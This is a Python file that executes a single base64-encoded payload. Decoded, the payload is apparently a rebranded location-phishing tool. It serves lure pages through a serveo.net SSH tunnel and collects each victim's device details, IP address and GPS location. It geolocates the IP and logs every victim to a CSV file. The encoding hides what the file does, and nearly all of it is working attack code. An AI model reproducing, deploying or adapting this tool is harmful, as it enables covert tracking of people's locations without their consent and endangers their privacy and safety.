import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQoKaW1wb3J0IG9zCmltcG9ydCBjc3YKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQganNvbgppbXBvcnQgYXJncGFyc2UKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdWJwcm9jZXNzIGFzIHN1YnAKClIgPSAnXDAzM1szMW0nICMgcmVkCkcgPSAnXDAzM1szMm0nICMgZ3JlZW4KQyA9ICdcMDMzWzM2bScgIyBjeWFuClcgPSAnXDAzM1swbScgICMgd2hpdGUKCnBhcnNlciA9IGFyZ3BhcnNlLkFyZ3VtZW50UGFyc2VyKCkKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXMnLCAnLS1zdWJkb21haW4nLCBoZWxwPSdQcm92aWRlIFN1YmRvbWFpbiBmb3IgU2VydmVvIFVSTCAoIE9wdGlvbmFsICknKQpwYXJzZXIuYWRkX2FyZ3VtZW50KCctaycsICctLWttbCcsIGhlbHA9J1Byb3ZpZGUgS01MIEZpbGVuYW1lICggT3B0aW9uYWwgKScpCnBhcnNlci5hZGRfYXJndW1lbnQoJy10JywgJy0tdHVubmVsJywgaGVscD0nU3BlY2lmeSBUdW5uZWwgTW9kZSBbIEF2YWlsYWJsZSA6IG1hbnVhbCBdJykKcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCAnLS1wb3J0JywgdHlwZT1pbnQsIGRlZmF1bHQ9ODA4MCwgaGVscD0nUG9ydCBmb3IgV2ViIFNlcnZlciBbIERlZmF1bHQgOiA4MDgwIF0nKQoKYXJncyA9IHBhcnNlci5wYXJzZV9hcmdzKCkKc3ViZG9tID0gYXJncy5zdWJkb21haW4Ka21sX2ZuYW1lID0gYXJncy5rbWwKdHVubmVsX21vZGUgPSBhcmdzLnR1bm5lbApwb3J0ID0gYXJncy5wb3J0Cgpyb3cgPSBbXQpzaXRlID0gJycKaW5mbyA9ICcnCnJlc3VsdCA9ICcnCnZlcnNpb24gPSAnMS4yLjQnCgpkZWYgYmFubmVyKCk6CglwcmludCAoRyArCglyJycnCl9fX19fX19fX19fICAgICBfX19fX19fX19fX19fX19fX19fX18gICAgX19fX18gIF9fX19fX19fXyAgX19fXyAgX18uX19fIF9fX19fX18gICAgX19fX19fX18gClxfICAgX19fX18vICAgICBcX18gICAgX19fL1xfX19fX18gICBcICAvICBfICBcIFxfICAgX19fIFx8ICAgIHwvIF98ICAgfFwgICAgICBcICAvICBfX19fXy8gCiB8ICAgIF9fKSAgX19fX19fIHwgICAgfCAgICB8ICAgICAgIF8vIC8gIC9fXCAgXC8gICAgXCAgXC98ICAgICAgPCB8ICAgfC8gICB8ICAgXC8gICBcICBfX18gCiB8ICAgICBcICAvX19fX18vIHwgICAgfCAgICB8ICAgIHwgICBcLyAgICB8ICAgIFwgICAgIFxfX198ICAgIHwgIFx8ICAgLyAgICB8ICAgIFwgICAgXF9cICBcCiBcX19fICAvICAgICAgICAgIHxfX19ffCAgICB8X19fX3xfICAvXF9fX198X18gIC9cX19fX19fICAvX19fX3xfXyBcX19fXF9fX198X18gIC9cX19fX19fICAvCiAgICAgXC8gICAgICAgICAgICAgICAgICAgICAgICAgICAgXC8gICAgICAgICBcLyAgICAgICAgXC8gICAgICAgIFwvICAgICAgICAgICBcLyAgICAgICAgXC8gICAgICAgICAnJycgKyBXKQoJcHJpbnQoJ1xuJyArIEcgKyAnWz5dJyArIEMgKyAnIENyZWF0ZWQgQnkgOiAnICsgVyArICdGU09DSUVUWSBBTEFTIFJPQkFOJykKCXByaW50KEcgKyAnWz5dJyArIEMgKyAnIFZlcnNpb24gICAgOiAnICsgVyArIHZlcnNpb24gKyAnXG4nKQoKZGVmIHZlcl9jaGVjaygpOgoJcHJpbnQoRyArICdbK10nICsgQyArICcgQ2hlY2tpbmcgZm9yIFVwZGF0ZXMuLi4uLicsIGVuZD0nJykKCXZlcl91cmwgPSAnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RoZXdoaXRlaDR0L3NlZWtlci9tYXN0ZXIvdmVyc2lvbi50eHQnCgl0cnk6CgkJdmVyX3Jxc3QgPSByZXF1ZXN0cy5nZXQodmVyX3VybCkKCQl2ZXJfc2MgPSB2ZXJfcnFzdC5zdGF0dXNfY29kZQoJCWlmIHZlcl9zYyA9PSAyMDA6CgkJCWdpdGh1Yl92ZXIgPSB2ZXJfcnFzdC50ZXh0CgkJCWdpdGh1Yl92ZXIgPSBnaXRodWJfdmVyLnN0cmlwKCkKCgkJCWlmIHZlcnNpb24gPT0gZ2l0aHViX3ZlcjoKCQkJCXByaW50KEMgKyAnWycgKyBHICsgJyBVcC1Uby1EYXRlICcgKyBDICsnXScgKyAnXG4nKQoJCQllbHNlOgoJCQkJcHJpbnQoQyArICdbJyArIEcgKyAnIEF2YWlsYWJsZSA6IHt9ICcuZm9ybWF0KGdpdGh1Yl92ZXIpICsgQyArICddJyArICdcbicpCgkJZWxzZToKCQkJcHJpbnQoQyArICdbJyArIFIgKyAnIFN0YXR1cyA6IHt9ICcuZm9ybWF0KHZlcl9zYykgKyBDICsgJ10nICsgJ1xuJykKCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCQlwcmludCgnXG4nICsgUiArICdbLV0nICsgQyArICcgRXhjZXB0aW9uIDogJyArIFcgKyBzdHIoZSkpCgpkZWYgdHVubmVsX3NlbGVjdCgpOgoJaWYgdHVubmVsX21vZGUgPT0gTm9uZToKCQlzZXJ2ZW8oKQoJZWxpZiB0dW5uZWxfbW9kZSA9PSAnbWFudWFsJzoKCQlwcmludChHICsgJ1srXScgKyBDICsgJyBTdGFyIE5ncm9rIER1bHUgU2VjYXJhIE1hbnVhbCAhISEsIEJhbmdzYXQgS2F1IEthbiBSZWNvZGUhIS4uLicgKyBXICsgJ1xuJykKCWVsc2U6CgkJcHJpbnQoUiArICdbK10nICsgQyArICcgSW52YWxpZCBUdW5uZWwgTW9kZSBTZWxlY3RlZCwgQ2hlY2sgSGVscCBbLWgsIC0taGVscF0nICsgVyArICdcbicpCgkJZXhpdCgpCgpkZWYgdGVtcGxhdGVfc2VsZWN0KCk6CglnbG9iYWwgc2l0ZSwgaW5mbywgcmVzdWx0CglwcmludChHICsgJ1srXScgKyBDICsgJyBTZWxlY3QgYSBUZW1wbGF0ZSA6ICcgKyBXICsgJ1xuJykKCQoJd2l0aCBvcGVuKCd0ZW1wbGF0ZS90ZW1wbGF0ZXMuanNvbicsICdyJykgYXMgdGVtcGw6CgkJdGVtcGxfaW5mbyA9IHRlbXBsLnJlYWQoKQoJCgl0ZW1wbF9qc29uID0ganNvbi5sb2Fkcyh0ZW1wbF9pbmZvKQoJCglmb3IgaXRlbSBpbiB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXToKCQluYW1lID0gaXRlbVsnbmFtZSddCgkJcHJpbnQoRyArICdbe31dJy5mb3JtYXQodGVtcGxfanNvblsndGVtcGxhdGVzJ10uaW5kZXgoaXRlbSkpICsgQyArICcge30nLmZvcm1hdChuYW1lKSArIFcpCgkKCXNlbGVjdGVkID0gaW50KGlucHV0KEcgKyAnWz5dICcgKyBXKSkKCQoJdHJ5OgoJCXNpdGUgPSB0ZW1wbF9qc29uWyd0ZW1wbGF0ZXMnXVtzZWxlY3RlZF1bJ2Rpcl9uYW1lJ10KCWV4Y2VwdCBJbmRleEVycm9yOgoJCXByaW50KCdcbicgKyBSICsgJ1stXScgKyBDICsgJyBJbnZhbGlkIElucHV0IScgKyBXICsgJ1xuJykKCQlzeXMuZXhpdCgpCgkKCXByaW50KCdcbicgKyBHICsgJ1srXScgKyBDICsgJyBMb2FkaW5nIHt9IFRlbXBsYXRlLi4uJy5mb3JtYXQodGVtcGxfanNvblsndGVtcGxhdGVzJ11bc2VsZWN0ZWRdWyduYW1lJ10pICsgVyArICdcbicpCgkKCW1vZHVsZSA9IHRlbXBsX2pzb25bJ3RlbXBsYXRlcyddW3NlbGVjdGVkXVsnbW9kdWxlJ10KCWlmIG1vZHVsZSA9PSBUcnVlOgoJCWltcF9maWxlID0gdGVtcGxfanNvblsndGVtcGxhdGVzJ11bc2VsZWN0ZWRdWydpbXBvcnRfZmlsZSddCgkJaW1wb3J0IGltcG9ydGxpYgoJCWltcG9ydGxpYi5pbXBvcnRfbW9kdWxlKCd0ZW1wbGF0ZS57fScuZm9ybWF0KGltcF9maWxlKSkKCWVsc2U6CgkJcGFzcwoKCWluZm8gPSAndGVtcGxhdGUve30vcGhwL2luZm8udHh0Jy5mb3JtYXQoc2l0ZSkKCXJlc3VsdCA9ICd0ZW1wbGF0ZS97fS9waHAvcmVzdWx0LnR4dCcuZm9ybWF0KHNpdGUpCgpkZWYgc2VydmVvKCk6CglnbG9iYWwgc2l0ZSwgc3ViZG9tCglmbGFnID0gRmFsc2UKCglwcmludChHICsgJ1srXScgKyBDICsgJyBDaGVja2luZyBTZXJ2ZW8gU3RhdHVzLi4uJywgZW5kPScnKQoKCXRyeToKCQl0aW1lLnNsZWVwKDEpCgkJcnFzdCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9zZXJ2ZW8ubmV0JywgdGltZW91dD01KQoJCXNjID0gcnFzdC5zdGF0dXNfY29kZQoJCWlmIHNjID09IDIwMDoKCQkJcHJpbnQoQyArICdbJyArIEcgKyAnIFVQICcgKyBDICsgJ10nICsgVyArICdcbicpCgkJZWxzZToKCQkJcHJpbnQoQyArICdbJyArIFIgKyAnU3RhdHVzIDoge30nLmZvcm1hdChzYykgKyBDICsgJ10nICsgVyArICdcbicpCgkJCWV4aXQoKQoJZXhjZXB0IHJlcXVlc3RzLkNvbm5lY3Rpb25FcnJvcjoKCQlwcmludChDICsgJ1snICsgUiArICcgRE9XTiAnICsgQyArICddJyArIFcgKyAnXG4nKQoJCWV4aXQoKQoJCQkKCXByaW50KEcgKyAnWytdJyArIEMgKyAnIEdldHRpbmcgU2VydmVvIFVSTC4uLicgKyBXICsgJ1xuJykKCWlmIHN1YmRvbSBpcyBOb25lOgoJCXdpdGggb3BlbignbG9ncy9zZXJ2ZW8udHh0JywgJ3cnKSBhcyB0bXBmaWxlOgoJCQlwcm9jID0gc3VicC5Qb3BlbihbJ3NzaCcsICctb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubycsICctUicsICc4MDpsb2NhbGhvc3Q6e30nLmZvcm1hdChwb3J0KSwgJ3NlcnZlby5uZXQnXSwgc3Rkb3V0PXRtcGZpbGUsIHN0ZGVycj10bXBmaWxlLCBzdGRpbj1zdWJwLlBJUEUpCgllbHNlOgoJCXdpdGggb3BlbignbG9ncy9zZXJ2ZW8udHh0JywgJ3cnKSBhcyB0bXBmaWxlOgoJCQlwcm9jID0gc3VicC5Qb3BlbihbJ3NzaCcsICctb1N0cmljdEhvc3RLZXlDaGVja2luZz1ubycsICctUicsICd7fS5zZXJ2ZW8ubmV0OjgwOmxvY2FsaG9zdDp7fScuZm9ybWF0KHN1YmRvbSwgcG9ydCksICdzZXJ2ZW8ubmV0J10sIHN0ZG91dD10bXBmaWxlLCBzdGRlcnI9dG1wZmlsZSwgc3RkaW49c3VicC5QSVBFKQoJCgl3aGlsZSBUcnVlOgoJCXdpdGggb3BlbignbG9ncy9zZXJ2ZW8udHh0JywgJ3InKSBhcyB0bXBmaWxlOgoJCQl0cnk6CgkJCQlzdGRvdXQgPSB0bXBmaWxlLnJlYWRsaW5lcygpCgkJCQlpZiBmbGFnID09IEZhbHNlOgoJCQkJCWZvciBlbGVtIGluIHN0ZG91dDoKCQkJCQkJaWYgJ0hUVFAnIGluIGVsZW06CgkJCQkJCQllbGVtID0gZWxlbS5zcGxpdCgnICcpCgkJCQkJCQl1cmwgPSBlbGVtWzRdLnN0cmlwKCkKCQkJCQkJCXVybCA9IHVybCArICcve30vJy5mb3JtYXQoc2l0ZSkKCQkJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFVSTCA6ICcgKyBXICsgdXJsKQoJCQkJCQkJZmxhZyA9IFRydWUKCQkJCQkJZWxzZToKCQkJCQkJCXBhc3MKCQkJCWVsaWYgZmxhZyA9PSBUcnVlOgoJCQkJCWJyZWFrCgkJCWV4Y2VwdCBFeGNlcHRpb24gYXMgZToKCQkJCXByaW50KGUpCgkJCQlwYXNzCgkJdGltZS5zbGVlcCgyKQoKZGVmIHNlcnZlcigpOgoJZ2xvYmFsIHNpdGUKCXByaW50KCdcbicgKyBHICsgJ1srXScgKyBDICsgJyBQb3J0IDogJysgVyArIHN0cihwb3J0KSkKCXByaW50KCdcbicgKyBHICsgJ1srXScgKyBDICsgJyBTdGFydGluZyBQSFAgU2VydmVyLi4uLi4uJyArIFcsIGVuZD0nJykKCXdpdGggb3BlbignbG9ncy9waHAubG9nJywgJ3cnKSBhcyBwaHBsb2c6CgkJc3VicC5Qb3BlbihbJ3BocCcsICctUycsICcwLjAuMC4wOnt9Jy5mb3JtYXQocG9ydCksICctdCcsICd0ZW1wbGF0ZS97fS8nLmZvcm1hdChzaXRlKV0sIHN0ZG91dD1waHBsb2csIHN0ZGVycj1waHBsb2cpCgkJdGltZS5zbGVlcCgzKQoJdHJ5OgoJCXBocF9ycXN0ID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vMC4wLjAuMDp7fS9pbmRleC5odG1sJy5mb3JtYXQocG9ydCkpCgkJcGhwX3NjID0gcGhwX3Jxc3Quc3RhdHVzX2NvZGUKCQlpZiBwaHBfc2MgPT0gMjAwOgoJCQlwcmludChDICsgJ1snICsgRyArICcgU3VjY2VzcyAnICsgQyArICddJyArIFcpCgkJZWxzZToKCQkJcHJpbnQoQyArICdbJyArIFIgKyAnU3RhdHVzIDoge30nLmZvcm1hdChwaHBfc2MpICsgQyArICddJyArIFcpCglleGNlcHQgcmVxdWVzdHMuQ29ubmVjdGlvbkVycm9yOgoJCXByaW50KEMgKyAnWycgKyBSICsgJyBGYWlsZWQgJyArIEMgKyAnXScgKyBXKQoJCVF1aXQoKQoKZGVmIHdhaXQoKToKCXByaW50ZWQgPSBGYWxzZQoJd2hpbGUgVHJ1ZToKCQl0aW1lLnNsZWVwKDIpCgkJc2l6ZSA9IG9zLnBhdGguZ2V0c2l6ZShyZXN1bHQpCgkJaWYgc2l6ZSA9PSAwIGFuZCBwcmludGVkID09IEZhbHNlOgoJCQlwcmludCgnXG4nICsgRyArICdbK10nICsgQyArICcgV2FpdGluZyBmb3IgVXNlciBJbnRlcmFjdGlvbi4uLicgKyBXICsgJ1xuJykKCQkJcHJpbnRlZCA9IFRydWUKCQlpZiBzaXplID4gMDoKCQkJbWFpbigpCgpkZWYgbWFpbigpOgoJZ2xvYmFsIGluZm8sIHJlc3VsdCwgcm93LCB2YXJfbGF0LCB2YXJfbG9uCgl0cnk6CgkJcm93ID0gW10KCQl3aXRoIG9wZW4gKGluZm8sICdyJykgYXMgZmlsZTI6CgkJCWZpbGUyID0gZmlsZTIucmVhZCgpCgkJCWpzb24zID0ganNvbi5sb2FkcyhmaWxlMikKCQkJZm9yIHZhbHVlIGluIGpzb24zWydkZXYnXToKCgkJCQl2YXJfb3MgPSB2YWx1ZVsnb3MnXQoJCQkJdmFyX3BsYXRmb3JtID0gdmFsdWVbJ3BsYXRmb3JtJ10KCQkJCXRyeToKCQkJCQl2YXJfY29yZXMgPSB2YWx1ZVsnY29yZXMnXQoJCQkJZXhjZXB0IFR5cGVFcnJvcjoKCQkJCQl2YXJfY29yZXMgPSAnTm90IEF2YWlsYWJsZScKCQkJCXZhcl9yYW0gPSB2YWx1ZVsncmFtJ10KCQkJCXZhcl92ZW5kb3IgPSB2YWx1ZVsndmVuZG9yJ10KCQkJCXZhcl9yZW5kZXIgPSB2YWx1ZVsncmVuZGVyJ10KCQkJCXZhcl9yZXMgPSB2YWx1ZVsnd2QnXSArICd4JyArIHZhbHVlWydodCddCgkJCQl2YXJfYnJvd3NlciA9IHZhbHVlWydicm93c2VyJ10KCQkJCXZhcl9pcCA9IHZhbHVlWydpcCddCgoJCQkJcm93LmFwcGVuZCh2YXJfb3MpCgkJCQlyb3cuYXBwZW5kKHZhcl9wbGF0Zm9ybSkgCgkJCQlyb3cuYXBwZW5kKHZhcl9jb3JlcykgCgkJCQlyb3cuYXBwZW5kKHZhcl9yYW0pIAoJCQkJcm93LmFwcGVuZCh2YXJfdmVuZG9yKQoJCQkJcm93LmFwcGVuZCh2YXJfcmVuZGVyKQoJCQkJcm93LmFwcGVuZCh2YXJfcmVzKQoJCQkJcm93LmFwcGVuZCh2YXJfYnJvd3NlcikKCQkJCXJvdy5hcHBlbmQodmFyX2lwKQoKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIERldmljZSBJbmZvcm1hdGlvbiA6ICcgKyBXICsgJ1xuJykKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIE9TICAgICAgICAgOiAnICsgVyArIHZhcl9vcykKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFBsYXRmb3JtICAgOiAnICsgVyArIHZhcl9wbGF0Zm9ybSkKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIENQVSBDb3JlcyAgOiAnICsgVyArIHZhcl9jb3JlcykKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFJBTSAgICAgICAgOiAnICsgVyArIHZhcl9yYW0pCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBHUFUgVmVuZG9yIDogJyArIFcgKyB2YXJfdmVuZG9yKQoJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgR1BVICAgICAgICA6ICcgKyBXICsgdmFyX3JlbmRlcikKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFJlc29sdXRpb24gOiAnICsgVyArIHZhcl9yZXMpCgkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBCcm93c2VyICAgIDogJyArIFcgKyB2YXJfYnJvd3NlcikKCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIFB1YmxpYyBJUCAgOiAnICsgVyArIHZhcl9pcCkKCgkJCQlycXN0ID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vZnJlZS5pcHdob2lzLmlvL2pzb24ve30nLmZvcm1hdCh2YXJfaXApKQoJCQkJc2MgPSBycXN0LnN0YXR1c19jb2RlCgoJCQkJaWYgc2MgPT0gMjAwOgoJCQkJCWRhdGEgPSBycXN0LnRleHQKCQkJCQlkYXRhID0ganNvbi5sb2FkcyhkYXRhKQoJCQkJCXZhcl9jb250aW5lbnQgPSBzdHIoZGF0YVsnY29udGluZW50J10pCgkJCQkJdmFyX2NvdW50cnkgPSBzdHIoZGF0YVsnY291bnRyeSddKQoJCQkJCXZhcl9yZWdpb24gPSBzdHIoZGF0YVsncmVnaW9uJ10pCgkJCQkJdmFyX2NpdHkgPSBzdHIoZGF0YVsnY2l0eSddKQoJCQkJCXZhcl9vcmcgPSBzdHIoZGF0YVsnb3JnJ10pCgkJCQkJdmFyX2lzcCA9IHN0cihkYXRhWydpc3AnXSkKCgkJCQkJcm93LmFwcGVuZCh2YXJfY29udGluZW50KQoJCQkJCXJvdy5hcHBlbmQodmFyX2NvdW50cnkpCgkJCQkJcm93LmFwcGVuZCh2YXJfcmVnaW9uKQoJCQkJCXJvdy5hcHBlbmQodmFyX2NpdHkpCgkJCQkJcm93LmFwcGVuZCh2YXJfb3JnKQoJCQkJCXJvdy5hcHBlbmQodmFyX2lzcCkKCgkJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgQ29udGluZW50ICA6ICcgKyBXICsgdmFyX2NvbnRpbmVudCkKCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBDb3VudHJ5ICAgIDogJyArIFcgKyB2YXJfY291bnRyeSkKCQkJCQlwcmludChHICsgJ1srXScgKyBDICsgJyBSZWdpb24gICAgIDogJyArIFcgKyB2YXJfcmVnaW9uKQoJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIENpdHkgICAgICAgOiAnICsgVyArIHZhcl9jaXR5KQoJCQkJCXByaW50KEcgKyAnWytdJyArIEMgKyAnIE9yZyAgICAgICAgOiAnICsgVyArIHZhcl9vcmcpCgkJCQkJcHJpbnQoRyArICdbK10nICsgQyArICcgSVNQICAgICAgICA6ICcgKyBXICsgdmFyX2lzcCkKCWV4Y2VwdCBWYWx1ZUVycm9yOgoJCXBhc3MKCQoJdHJ5OgoJCXdpdGggb3BlbiAocmVzdWx0LCAncicpIGFzIGZpbGU6CgkJCWZpbGUgPSBmaWxlLnJlYWQoKQoJCQlqc29uMiA9IGpzb24ubG9hZHMoZmlsZSkKCQkJZm9yIHZhbHVlIGluIGpzb24yWydpbmZvJ106CgkJCQl2YXJfbGF0ID0gdmFsdWVbJ2xhdCddICsgJyBkZWcnCgkJCQl2YXJfbG9uID0gdmFsdWVbJ2xvbiddICsgJyBkZWcnCgkJCQl2YXJfYWNjID0gdmFsdWVbJ2FjYyddICsgJyBtJwoKCQkJCXZhcl9hbHQgPSB2YWx1ZVsnYWx0J10KCQkJCWlmIHZhcl9hbHQgPT0gJyc6CgkJCQkJdmFyX2FsdCA9ICdOb3QgQXZhaWxhYmxlJwoJCQkJZWxzZToKCQkJCQl2YXJfYWx0ID09IHZhbHVlWydhbHQnXSArICcgbScKCQkJCQoJCQkJdmFyX2RpciA9IHZhbHVlWydkaXInXQoJCQkJaWYgdmFyX2RpciA9PSAnJzoKCQkJCQl2YXJfZGlyID0gJ05vdCBBdmFpbGFibGUnCgkJCQllbHNlOgoJCQkJCXZhcl9kaXIgPSB2YWx1ZVsnZGlyJ10gKyAnIGRlZycKCQkJCQoJCQkJdmFyX3NwZCA9IHZhbHVlWydzcGQnXQoJCQkJaWYgdmFyX3NwZCA9PSAnJzoKCQkJCQl2YXJfc3BkID0gJ05vdCBBdmFpbGFibGUnCgkJCQllbHNlOgoJCQkJCXZhcl9zcGQgPSB2YWx1ZVsnc3BkJ10gKyAnIG0vcycKCgkJCQlyb3cuYXBwZW5kKHZhcl9sYXQpCgkJCQlyb3cuYXBwZW5kKHZhcl9sb24pCgkJCQlyb3cuYXBwZW5kKHZhcl9hY2MpCgkJCQlyb3cuYXBwZW5kKHZhcl9hbHQpCgkJCQlyb3cuYXBwZW5kKHZhcl9kaXIpCgkJCQlyb3cuYXBwZW5kKHZhcl9zcGQpCgoJCQkJcHJpbnQgKCdcbicgKyBHICsgJ1srXScgKyBDICsgJyBMb2NhdGlvbiBJbmZvcm1hdGlvbiA6ICcgKyBXICsgJ1xuJykKCQkJCXByaW50IChHICsgJ1srXScgKyBDICsgJyBMYXRpdHVkZSAgOiAnICsgVyArIHZhcl9sYXQpCgkJCQlwcmludCAoRyArICdbK10nICsgQyArICcgTG9uZ2l0dWRlIDogJyArIFcgKyB2YXJfbG9uKQoJCQkJcHJpbnQgKEcgKyAnWytdJyArIEMgKyAnIEFjY3VyYWN5ICA6ICcgKyBXICsgdmFyX2FjYykKCQkJCXByaW50IChHICsgJ1srXScgKyBDICsgJyBBbHRpdHVkZSAgOiAnICsgVyArIHZhcl9hbHQpCgkJCQlwcmludCAoRyArICdbK10nICsgQyArICcgRGlyZWN0aW9uIDogJyArIFcgKyB2YXJfZGlyKQoJCQkJcHJpbnQgKEcgKyAnWytdJyArIEMgKyAnIFNwZWVkICAgICA6ICcgKyBXICsgdmFyX3NwZCkKCWV4Y2VwdCBWYWx1ZUVycm9yOgoJCWVycm9yID0gZmlsZQoJCXByaW50ICgnXG4nICsgUiArICdbLV0gJyArIFcgKyBlcnJvcikKCQlyZXBlYXQoKQoKCXByaW50ICgnXG4nICsgRyArICdbK10nICsgQyArICcgR29vZ2xlIE1hcHMuLi4uLi4uLi4uLi4uLi4uLjogJyArIFcgKyAnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS9tYXBzL3BsYWNlLycgKyB2YXJfbGF0LnN0cmlwKCcgZGVnJykgKyAnKycgKyB2YXJfbG9uLnN0cmlwKCcgZGVnJykpCgkKCWlmIGttbF9mbmFtZSBpcyBub3QgTm9uZToKCQlrbWxvdXQodmFyX2xhdCwgdmFyX2xvbikKCgljc3ZvdXQoKQoJcmVwZWF0KCkKCmRlZiBrbWxvdXQodmFyX2xhdCwgdmFyX2xvbik6Cgl3aXRoIG9wZW4oJ3RlbXBsYXRlL3NhbXBsZS5rbWwnLCAncicpIGFzIGttbF9zYW1wbGU6CgkJa21sX3NhbXBsZV9kYXRhID0ga21sX3NhbXBsZS5yZWFkKCkKCglrbWxfc2FtcGxlX2RhdGEgPSBrbWxfc2FtcGxlX2RhdGEucmVwbGFjZSgnTE9OR0lUVURFJywgdmFyX2xvbi5zdHJpcCgnIGRlZycpKQoJa21sX3NhbXBsZV9kYXRhID0ga21sX3NhbXBsZV9kYXRhLnJlcGxhY2UoJ0xBVElUVURFJywgdmFyX2xhdC5zdHJpcCgnIGRlZycpKQoKCXdpdGggb3Blbigne30ua21sJy5mb3JtYXQoa21sX2ZuYW1lKSwgJ3cnKSBhcyBrbWxfZ2VuOgoJCWttbF9nZW4ud3JpdGUoa21sX3NhbXBsZV9kYXRhKQoKCXByaW50KEcgKyAnWytdJyArIEMgKyAnIEtNTCBGaWxlIEdlbmVyYXRlZC4uLi4uLi4uLi46ICcgKyBXICsgb3MuZ2V0Y3dkKCkgKyAnL3t9LmttbCcuZm9ybWF0KGttbF9mbmFtZSkpCgpkZWYgY3N2b3V0KCk6CglnbG9iYWwgcm93Cgl3aXRoIG9wZW4oJ2RiL3Jlc3VsdHMuY3N2JywgJ2EnKSBhcyBjc3ZmaWxlOgoJCXdyaXRlciA9IGNzdi53cml0ZXIoY3N2ZmlsZSkKCQl3cml0ZXIud3JpdGVyb3cocm93KQoJcHJpbnQoRyArICdbK10nICsgQyArICcgTmV3IEVudHJ5IEFkZGVkIGluIERhdGFiYXNlLjogJyArIFcgKyBvcy5nZXRjd2QoKSArICcvZGIvcmVzdWx0cy5jc3YnKQoKZGVmIGNsZWFyKCk6CglnbG9iYWwgcmVzdWx0Cgl3aXRoIG9wZW4gKHJlc3VsdCwgJ3crJyk6IHBhc3MKCXdpdGggb3BlbiAoaW5mbywgJ3crJyk6IHBhc3MKCmRlZiByZXBlYXQoKToKCWNsZWFyKCkKCXdhaXQoKQoJbWFpbigpCgpkZWYgUXVpdCgpOgoJZ2xvYmFsIHJlc3VsdAoJd2l0aCBvcGVuIChyZXN1bHQsICd3KycpOiBwYXNzCglvcy5zeXN0ZW0oJ3BraWxsIHBocCcpCglleGl0KCkKCnRyeToKCWJhbm5lcigpCgl2ZXJfY2hlY2soKQoJdHVubmVsX3NlbGVjdCgpCgl0ZW1wbGF0ZV9zZWxlY3QoKQoJc2VydmVyKCkKCXdhaXQoKQoJbWFpbigpCgpleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CglwcmludCAoJ1xuJyArIFIgKyAnWyFdJyArIEMgKyAnIEtleWJvYXJkIEludGVycnVwdC4nICsgVykKCVF1aXQoKQ=='))